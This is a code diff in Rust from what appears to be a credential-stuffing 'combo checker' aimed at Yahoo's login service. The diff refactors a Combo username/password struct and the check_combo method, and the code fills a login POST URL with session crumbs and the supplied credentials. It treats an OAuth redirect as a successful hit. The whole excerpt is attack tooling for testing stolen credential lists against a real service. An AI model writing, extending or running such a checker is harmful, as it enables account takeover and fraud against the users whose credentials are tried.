@@ -9,9 +9,9 @@ pub enum CheckerStatus {
 }
 
 #[derive(Debug)]
-pub struct Combo<'a> {
-    pub username: &'a str,
-    pub password: &'a str,
+pub struct Combo {
+    pub username: String,
+    pub password: String,
 }
 
 #[derive(Debug)]
@@ -35,7 +35,7 @@ impl Checker {
 
     pub async fn check_combo(
         &self,
-        combo: Combo<'_>,
+        combo: &Combo,
     ) -> Result<CheckerStatus, Box<dyn std::error::Error>> {
         let response = self.initial_request().await?;
         let data = get_source_data(&response);
@@ -52,11 +52,10 @@ impl Checker {
             return Ok(CheckerStatus::Failure);
         }
 
-        let json_res = json::parse(&response)?;
-        println!("{}", json_res);
+        let loc = "";
 
         let response = self
-            .post_request(format!("https://login.yahoo.com{}", ""))
+            .post_request(format!("https://login.yahoo.com{}", loc))
             .await?;
 
         if response.contains("https://api.login.yahoo.com/oauth2/") {
@@ -115,10 +114,10 @@ fn parse_source<'a>(source: &'a String, lstr: &str) -> &'a str {
     &source[start..start + end]
 }
 
-fn yahoo_post_url(url: &str, data: SourceData, combo: Combo) -> String {
+fn yahoo_post_url(url: &str, data: SourceData, combo: &Combo) -> String {
     url.replace("<ac>", data.acrumb)
         .replace("<c>", data.crumb)
         .replace("<si>", data.session_index)
-        .replace("<USER>", combo.username)
-        .replace("<PASS>", combo.password)
+        .replace("<USER>", &combo.username)
+        .replace("<PASS>", &combo.password)
 }
